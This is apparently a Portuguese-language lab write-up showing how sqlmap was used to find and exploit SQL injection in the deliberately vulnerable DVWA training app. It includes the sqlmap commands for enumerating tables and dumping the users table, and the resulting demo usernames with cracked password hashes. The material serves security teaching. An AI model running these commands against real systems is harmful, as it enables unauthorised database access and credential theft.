# Como reproduzir a vulnerabilidade de SQL Injection

## sqlmap

Foi executado o sqlmap para identificar a vulnerabilidade de SQL Injection no DVWA. Para executá-lo, foi necessário obter o cookie PHPSESSID ao fazer login no DVWA. Esse cookie é passado ao sqlmap para que ele possa começar a execução.

O script do sqlmap está definido em [sqlmap_sqli_dump.sh](./scripts/sqlmap_sqli_dump.sh)

Os resultados foram salvos em [sqlmap_run.txt](./evidencias/sqlmap_run.txt). Nele, é possível identificar as seguintes informações:


O sqlmap conseguiu identificar que o banco de dados é baseado em **MySQL**. As seguintes vulnerabilidades foram identificadas:


```
GET parameter 'id' is vulnerable
```

Isso indica que o parâmetro `id` é vulnerável a SQL Injection via GET na URL. A partir desse parâmetro, foi possível identificar os seguintes tipos de injeção:

```
Type: boolean-based blind
```
- Neste tipo de injeção, a aplicação responde de forma diferente dependendo da condição True/False da query SQL.


```
Type: error-based
``` 

- Neste tipo de injeção, a aplicação revela informações sobre a estrutura do banco de dados ou dados sensíveis dentro de mensagens de erro.


```
Type: UNION query
```
- Neste tipo de injeção, a aplicação combina os resultados da query original com os resultados da query injetada para realizar o dump de dados do banco de dados.


Além dessas informações, também foi possível identificar dois bancos de dados:

```
available databases [2]:
[*] dvwa
[*] information_schema
```

Sendo que o banco de dados `dvwa` é o que contém as informações relevantes para o projeto, enquanto a `information_schema` é padrão do MySQL, e contém informações sobre o banco de dados.

A partir dessas informações, foi executado um comando para ter acesso a quais são as tabelas do banco de dados `dvwa`. O comando executado é:

```
sqlmap -u "URL_DO_ALVO" --cookie="PHPSESSID=SEU_COOKIE; security=low" -D dvwa --tables --batch
```

Em que SEU_COOKIE é o cookie obtido na etapa anterior. Após execução, foi possível identificar nos resultados a seguinte informação de tabelas:

```
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```

Como foram encontradas duas tabelas, e uma delas envolve dados de usuários, o alvo foi definido como a tabela `users`. A partir disso, foi feito um dump para obter todos os registros da tabela. O comando executado é:    

```
sqlmap -u "URL_DO_ALVO" --cookie="SEU_COOKIE" -D dvwa -T users --dump --batch
```

E como resultado, foi possível obter dados sensíveis, como nomes de usuários e senhas. Por causa da flag --batch, o sqlmap tentou usar um ataque de dictionary para quebrar as senhas, e com isso, foi possível obter as senhas de todos os usuários.

```
Database: dvwa
Table: users
[5 entries]
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2026-02-03 22:57:36 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2026-02-03 22:57:36 | 0            |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2026-02-03 22:57:36 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2026-02-03 22:57:36 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2026-02-03 22:57:36 | 0            |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+

```

Dessa forma, foi possivel exemplificar a vulnerabilidade de SQL Injection no DVWA, e como resultado, foi possível obter dados sensíveis que estavam disponíveis na base de dados do DVWA.